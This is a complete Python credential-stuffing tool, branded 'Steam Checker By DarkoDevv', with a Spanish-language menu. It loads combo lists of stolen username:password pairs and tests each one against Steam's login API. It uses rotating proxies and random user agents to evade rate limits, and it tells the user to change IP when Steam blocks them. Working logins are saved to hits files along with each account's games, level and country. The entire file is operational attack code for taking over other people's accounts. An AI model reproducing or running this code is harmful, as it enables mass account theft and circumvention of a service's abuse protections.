import os, sys, json, time, base64, itertools, random, platform
import urllib.parse, urllib.request, urllib.error
from http.cookiejar import CookieJar
from threading import Lock, Event

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.align import Align

console = Console(highlight=False)

_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
_FOLDER = os.path.join(_BASE_DIR, "SteamChecker")
if not os.path.exists(_FOLDER):
    os.makedirs(_FOLDER)

_CFG_PATH = os.path.join(_FOLDER, ".steam_cfg.json")
_HITS_PATH = os.path.join(_FOLDER, "hits_live.txt")
_2FA_PATH = os.path.join(_FOLDER, "hits_2fa.txt")
_RATELIMIT_PATH = os.path.join(_FOLDER, "ratelimit_flag.txt")
_PROGRESS_PATH = os.path.join(_FOLDER, ".steam_progress.txt")

_RSA_URL = "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/"
_BEGIN_URL = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/"
_POLL_URL = "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/"
_GAMES_URL = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/"
_LEVEL_URL = "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/"
_SUMMARY_URL = "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/"
_LOGIN_PAGE = "https://store.steampowered.com/login/"

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
]
def _random_ua(): return random.choice(_USER_AGENTS)

_BASE_HDRS = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://store.steampowered.com",
    "Referer": "https://store.steampowered.com/login/",
    "X-Requested-With": "XMLHttpRequest",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
}

_ERESULT_INVALID_PW = 5
_ERESULT_ACCOUNT_404 = 18
_ERESULT_LOCKED = 63
_ERESULT_RATE_LIMIT = 84
_GUARD_NONE_TYPES = {0, 1}
_GUARD_EMAIL = 2
_GUARD_DEVICE = 3
_GUARD_DEVICE_CONF = 4
_MAX_POLL = 3
_POLL_DELAY = 2.0

_hits_lock = Lock()
_proxy_lock = Lock()
_RATE_LIMIT = Event()

def _get_os_name():
    if "com.termux" in os.environ.get("PREFIX", ""): return "termux"
    if os.name == "nt": return "powershell" if "PS" in os.environ.get("PROMPT", "") else "cmd"
    return platform.system().lower()

_OS_NAME = _get_os_name()

def _clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def _rsa_encrypt(password, mod_hex, exp_hex):
    mod = int(mod_hex, 16); exp = int(exp_hex, 16)
    key_len = (mod.bit_length() + 7) // 8
    msg = password.encode("utf-8")
    if len(msg) > key_len - 11: raise ValueError("Password too long")
    pad_len = key_len - len(msg) - 3
    ps = bytearray()
    while len(ps) < pad_len:
        ps.extend(b for b in os.urandom(pad_len * 2) if b != 0)
    em = b"\x00\x02" + bytes(ps[:pad_len]) + b"\x00" + msg
    c = pow(int.from_bytes(em, "big"), exp, mod)
    return base64.b64encode(c.to_bytes(key_len, "big")).decode("ascii")

class ProxyRotator:
    def __init__(self, proxies):
        self._cycle = itertools.cycle(proxies) if proxies else itertools.cycle([None])
    def next(self):
        with _proxy_lock: return next(self._cycle)

def _make_opener(proxy_url):
    jar = CookieJar()
    handlers = [urllib.request.HTTPCookieProcessor(jar)]
    if proxy_url:
        handlers.append(urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url}))
    return urllib.request.build_opener(*handlers)

def _load_proxy_file(path):
    proxies = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    if "://" not in line: line = "http://" + line
                    proxies.append(line)
    except: pass
    return proxies

def _post_form(opener, url, form, timeout=20):
    data = urllib.parse.urlencode(form).encode()
    headers = dict(_BASE_HDRS); headers["User-Agent"] = _random_ua()
    req = urllib.request.Request(url, data=data, headers=headers)
    req.add_header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: body = json.loads(e.read() or b"{}")
        except: body = {}
        return e.code, body
    except Exception as exc: return 0, {"_exc": str(exc)}

def _get_json(opener, url, params, timeout=20):
    full = url + "?" + urllib.parse.urlencode(params)
    headers = dict(_BASE_HDRS); headers["User-Agent"] = _random_ua()
    req = urllib.request.Request(full, headers=headers)
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: body = json.loads(e.read() or b"{}")
        except: body = {}
        return e.code, body
    except Exception as exc: return 0, {"_exc": str(exc)}

def _get_games(opener, token, steamid, timeout):
    s, r = _get_json(opener, _GAMES_URL, {"access_token": token, "steamid": steamid, "include_appinfo": "true"}, timeout)
    if s != 200: return -1, []
    resp = r.get("response") or {}
    gl = [{"appid": g.get("appid", 0), "name": g.get("name", "Unknown"), "playtime": g.get("playtime_forever", 0)} for g in (resp.get("games") or [])]
    gl.sort(key=lambda x: x["playtime"], reverse=True)
    return resp.get("game_count", 0), gl

def _get_level(opener, token, steamid, timeout):
    s, r = _get_json(opener, _LEVEL_URL, {"access_token": token, "steamid": steamid}, timeout)
    return (r.get("response") or {}).get("player_level", 0) if s == 200 else -1

def _get_summary(opener, token, steamid, timeout):
    s, r = _get_json(opener, _SUMMARY_URL, {"access_token": token, "steamids": steamid}, timeout)
    p = (r.get("response") or {}).get("players") or []
    return p[0] if s == 200 and p else {}

def _fmt_playtime(minutes):
    if minutes == 0: return "Nunca"
    if minutes < 60: return f"{minutes}m"
    h, m = minutes // 60, minutes % 60
    return f"{h:,}h" if h >= 1000 else f"{h}h {m}m"

def check_account(username, password, proxy_url, timeout=20):
    if _RATE_LIMIT.is_set(): return {"username": username, "password": password, "status": "SKIP"}
    opener = _make_opener(proxy_url)
    result = {"username": username, "password": password}

    try: opener.open(urllib.request.Request(_LOGIN_PAGE, headers={"User-Agent": _random_ua()}), timeout=timeout).close()
    except: pass

    s, r = _get_json(opener, _RSA_URL, {"account_name": username}, timeout)
    rsa = (r.get("response") or {})
    if s == 429 or r.get("eresult") == _ERESULT_RATE_LIMIT:
        _RATE_LIMIT.set(); return {**result, "status": "ERR", "reason": "Rate-Limit"}

    if s != 200 or not rsa.get("publickey_mod"): return {**result, "status": "ERR", "reason": "RSA"}

    try: enc_pass = _rsa_encrypt(password, rsa["publickey_mod"], rsa["publickey_exp"])
    except: return {**result, "status": "ERR", "reason": "RSA"}

    s, r = _post_form(opener, _BEGIN_URL, {
        "account_name": username, "encrypted_password": enc_pass,
        "encryption_timestamp": rsa["timestamp"], "remember_login": "true",
        "persistence": "1", "website_id": "Community", "device_friendly_name": "Chrome",
        "platform_type": "2", "language": "english", "qos_level": "2"
    }, timeout)

    resp = r.get("response") or {}
    eresult = resp.get("eresult", 0)

    if eresult == _ERESULT_RATE_LIMIT or s == 429:
        _RATE_LIMIT.set(); return {**result, "status": "ERR", "reason": "Rate-Limit"}
    if eresult in (_ERESULT_INVALID_PW, _ERESULT_ACCOUNT_404) or s == 401: return {**result, "status": "DEAD"}
    if eresult == _ERESULT_LOCKED: return {**result, "status": "DEAD"}
    if s == 200 and not resp.get("client_id"): return {**result, "status": "DEAD"}

    steamid = str(resp.get("steamid", ""))
    client_id = str(resp.get("client_id", ""))
    request_id = resp.get("request_id", "")

    guard_types = {int(c.get("confirmation_type", 0)) for c in (resp.get("allowed_confirmations") or [])}
    has_guard = bool(guard_types - _GUARD_NONE_TYPES)
    guard_label = "Mobile" if (_GUARD_DEVICE in guard_types or _GUARD_DEVICE_CONF in guard_types) else ("Email" if _GUARD_EMAIL in guard_types else "None")

    if has_guard: return {**result, "status": "2FA", "steamid": steamid, "guard": guard_label}

    access_token, poll_eresult = None, 0
    for attempt in range(_MAX_POLL):
        s, r = _post_form(opener, _POLL_URL, {"client_id": client_id, "request_id": request_id}, timeout)
        pr = r.get("response") or {}
        poll_eresult = pr.get("eresult", 0)
        if pr.get("access_token"):
            access_token = pr["access_token"]; break
        if attempt < _MAX_POLL - 1: time.sleep(_POLL_DELAY)

    if not access_token:
        if poll_eresult == _ERESULT_RATE_LIMIT:
            _RATE_LIMIT.set(); return {**result, "status": "ERR", "reason": "Rate-Limit"}
        return {**result, "status": "DEAD"}

    gc, gl = _get_games(opener, access_token, steamid, timeout)
    level = _get_level(opener, access_token, steamid, timeout)
    summary = _get_summary(opener, access_token, steamid, timeout)

    return {
        **result, "status": "LIVE", "steamid": steamid, "games_list": gl, "game_count": gc,
        "level": level, "country": (summary.get("loccountrycode") or "N/A").upper(),
        "persona": summary.get("personaname", "N/A"), "guard": "None"
    }

def _save_hits(vh, nh):
    with _hits_lock:
        if vh:
            with open(_HITS_PATH, "a", encoding="utf-8") as f:
                for r in vh:
                    f.write(f"LIVE | {r['username']}:{r['password']} | Games: {r['game_count']} | Level: {r['level']} | Country: {r['country']}\n")
                    for g in r.get("games_list", []):
                        f.write(f"    -> {g['name']} [{_fmt_playtime(g['playtime'])}]\n")
        if nh:
            with open(_2FA_PATH, "a", encoding="utf-8") as f:
                for r in nh:
                    f.write(f"2FA | {r['username']}:{r['password']} | Guard: {r['guard']} | SteamID: {r['steamid']}\n")

def print_result(res, pos=""):
    st = res.get("status")
    u, p = res.get("username", ""), res.get("password", "")
    
    if st == "LIVE":
        print(f"\n{pos} \033[1;37;41m LIVE \033[0m \033[1;37m{u}:{p}\033[0m | Games: \033[1;31m{res['game_count']}\033[0m | Lvl: \033[1;31m{res['level']}\033[0m", flush=True)
        if res.get("games_list"):
            for g in res["games_list"]: 
                print(f"         \033[2m└─ {g['name']} [{_fmt_playtime(g['playtime'])}]\033[0m", flush=True)
        else:
            print("         \033[2m└─ (Perfil privado / Sin juegos)\033[0m", flush=True)
    elif st == "2FA":
        print(f"\n{pos} \033[1;31m 2FA  \033[0m \033[1;37m{u}:{p}\033[0m | Guard: \033[1;31m{res['guard']}\033[0m", flush=True)
    elif st == "DEAD":
        print(f"\n{pos} \033[2;31m DEAD \033[0m \033[2m{u}:{p}\033[0m", flush=True)
    else:
        print(f"\n{pos} \033[1;33m ERR  \033[0m \033[2m{u}:{p} ({res.get('reason', '')})\033[0m", flush=True)

def draw_banner():
    ancho = console.width if console.width else 80
    ancho_panel = ancho if ancho < 80 else 80
    
    banner_texto = (
        "\n[bold red]███████╗████████╗███████╗ █████╗ ███╗   ███╗[/bold red]\n"
        "[bold red]██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║[/bold red]\n"
        "[bold #ff6666]███████╗   ██║   █████╗  ███████║██╔████╔██║[/bold #ff6666]\n"
        "[bold white]╚════██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║[/bold white]\n"
        "[bold white]███████║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║[/bold white]\n"
        "[bold #ff6666]╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝[/bold #ff6666]\n"
        "[dim white]        Steam Checker By DarkoDevv v1.0[/dim white]"
    )
    
    banner = Panel(
        Align.center(banner_texto),
        border_style="red", box=box.ROUNDED, width=ancho_panel
    )
    console.print(Align.center(banner))

def draw_prompt():
    sys.stdout.write(f"\033[1;31m┌──\033[0m(\033[1;31mSteamChecker\033[0m㉿\033[1;31m{_OS_NAME}\033[0m)\n")
    sys.stdout.write("\033[1;31m└─\033[0m\033[1;37m$\033[0m ")
    sys.stdout.flush()

def run_single(rotator, cfg):
    _clear()
    draw_banner()
    _clear()
    draw_banner()
    print("\n\033[1;31mCheckeo Individual:\033[0m ", end="", flush=True)
    c = sys.stdin.readline().strip()
    print()
    
    head = c.split("|")[0].strip()
    if ":" not in head:
        print("\n\033[1;31mFormato inválido.\033[0m"); time.sleep(2); return
    u, p = head.split(":", 1)
    
    print(f"\n\033[2mChequeando {u}...\033[0m")
    res = check_account(u.strip(), p.strip(), rotator.next(), cfg["timeout"])
    
    print_result(res, "")
    
    if res.get("status") == "LIVE": _save_hits([res], [])
    elif res.get("status") == "2FA": _save_hits([], [res])
    
    print()
    input("Presiona Enter para volver...")

def run_bulk(accounts, rotator, cfg):
    hits_live = hits_2fa = dead = errors = 0
    vh, nh = [], []
    
    processed = set()
    if os.path.exists(_PROGRESS_PATH):
        with open(_PROGRESS_PATH, "r") as f:
            processed = set(line.strip() for line in f)
            
    accounts_to_check = [a for a in accounts if f"{a[0]}:{a[1]}" not in processed]
    skipped = len(accounts) - len(accounts_to_check)
    
    _clear()
    draw_banner()
    print(f"\n\033[1;31m▶ Iniciando Mass Check:\033[0m {len(accounts_to_check)} pendientes (Saltando {skipped} ya chequeadas)\n")

    with open(_PROGRESS_PATH, "a") as pf:
        for i, (user, pw) in enumerate(accounts_to_check, 1):
            if _RATE_LIMIT.is_set():
                print("\n\033[1;31m¡TU IP HA SIDO BLOQUEADA POR STEAM!\033[0m\nPor favor, cambia tu conexión y presiona ENTER para continuar.")
                input(" > ")
                _RATE_LIMIT.clear()
                if os.path.exists(_RATELIMIT_PATH): os.remove(_RATELIMIT_PATH)

            time.sleep(cfg["delay"])
            res = check_account(user, pw, rotator.next(), cfg["timeout"])
            pf.write(f"{user}:{pw}\n")
            pf.flush()

            st = res.get("status")
            pos = f"\033[2m{i}/{len(accounts_to_check)}\033[0m"

            if st == "LIVE":
                hits_live += 1; vh.append(res)
            elif st == "2FA":
                hits_2fa += 1; nh.append(res)
            elif st == "DEAD":
                dead += 1
            else:
                errors += 1
            
            print_result(res, pos)
            
            if i % 30 == 0:
                _clear()
                draw_banner()
                print(f"\n\033[1;31m▶ Progreso:\033[0m {i}/{len(accounts_to_check)} | \033[1;37mLive: {hits_live}\033[0m | \033[1;31m2FA: {hits_2fa}\033[0m | \033[2mDead: {dead}\033[0m\n")

            if (hits_live + hits_2fa + dead + errors) % 10 == 0:
                _save_hits(vh, nh); vh.clear(); nh.clear()

        _save_hits(vh, nh)
    
    print(f"\n\033[1;31m■ Completado:\033[0m Live: \033[1;37m{hits_live}\033[0m | 2FA: \033[1;31m{hits_2fa}\033[0m | Dead: \033[2m{dead}\033[0m | Errores: \033[1;33m{errors}\033[0m")
    
    print()
    input("Presiona Enter para volver...")

_CFG_DEFAULT = {"workers": 3, "timeout": 25, "delay": 1.0, "proxy_mode": "direct", "proxy_list": ""}

def load_cfg():
    if os.path.exists(_CFG_PATH):
        try: return {**_CFG_DEFAULT, **json.load(open(_CFG_PATH))}
        except: pass
    return dict(_CFG_DEFAULT)

def save_cfg(cfg): json.dump(cfg, open(_CFG_PATH, "w"), indent=2)

def get_rotator(cfg):
    if cfg.get("proxy_mode") == "list" and cfg.get("proxy_list"):
        p = _load_proxy_file(cfg["proxy_list"])
        if p:
            print(f"\033[1;31m⚡\033[0m {len(p)} proxies cargados.")
            return ProxyRotator(p)
    print("\033[1;33m⚡\033[0m Usando conexión directa (Sin proxy).")
    return ProxyRotator([None])

def menu():
    cfg = load_cfg()
    while True:
        _clear()
        draw_banner()

        stat = Table(show_header=False, box=None)
        stat.add_column(style="red", justify="right")
        stat.add_column(style="white", justify="left")
        stat.add_row("Proxy Mode: ", f"{cfg['proxy_mode']} ({cfg.get('proxy_list', 'N/A')})")
        stat.add_row("Workers: ", str(cfg['workers']))
        stat.add_row("Delay: ", f"{cfg['delay']}s")
        console.print(Align.center(stat))

        print("\n\033[1;31m1.\033[0m Mass Check (Lote)")
        print("\033[1;31m2.\033[0m Check Single Account")
        print("\033[1;31m3.\033[0m Configuración")
        print("\033[1;31m0.\033[0m Salir\n")

        print("\033[1;31m┌──\033[0m(\033[1;31mSteamChecker\033[0m㉿\033[1;31m" + _OS_NAME + "\033[0m)")
        print("\033[1;31m└─\033[0m\033[1;37m$\033[0m ", end="", flush=True)
        choice = sys.stdin.readline().strip()
        print("\033[F\033[K", end="", flush=True)

        if choice == "0":
            _clear()
            draw_banner()
            print("\n\033[1;37mHasta luego, espero que vuelvas 👋🏻\033[0m\n")
            break
        elif choice == "1":
            _clear()
            draw_banner()
            print("\n\033[1;31mArchivo de combos:\033[0m ", end="", flush=True)
            path = sys.stdin.readline().strip() or "accounts.txt"
            print()
            
            if not os.path.exists(path):
                print("\n\033[1;31mArchivo no encontrado.\033[0m"); time.sleep(2); continue
            
            rotator = get_rotator(cfg)
            
            accounts, seen = [], set()
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    head = line.split("|")[0].strip()
                    if ":" in head:
                        u, p = head.split(":", 1)
                        c = (u.strip(), p.strip())
                        if c not in seen and u and p:
                            seen.add(c); accounts.append(c)
            
            try: run_bulk(accounts, rotator, cfg)
            except KeyboardInterrupt: 
                print("\n\033[1;31mPausado.\033[0m")
                input("\nPresiona Enter para volver...")
            
        elif choice == "2":
            rotator = get_rotator(cfg)
            run_single(rotator, cfg)

        elif choice == "3":
            _clear()
            draw_banner()
            _clear()
            draw_banner()
            print("\n\033[1;31mConfiguración\033[0m")
            print(f"1. Workers (Actual: {cfg['workers']})")
            print(f"2. Delay en seg (Actual: {cfg['delay']})")
            print(f"3. Ruta de proxies.txt (Actual: {cfg.get('proxy_list', 'Ninguno')})")
            print("0. Volver\n")
            print("\033[1;31mOpción:\033[0m ", end="", flush=True)
            sub = sys.stdin.readline().strip()
            print()
            if sub == "1": cfg["workers"] = int(input("Nuevo Workers > "))
            elif sub == "2": cfg["delay"] = float(input("Nuevo Delay > "))
            elif sub == "3":
                p = input("Ruta del archivo txt > ").strip()
                cfg["proxy_list"] = p
                cfg["proxy_mode"] = "list" if p else "direct"
            save_cfg(cfg)

if __name__ == "__main__":
    menu()
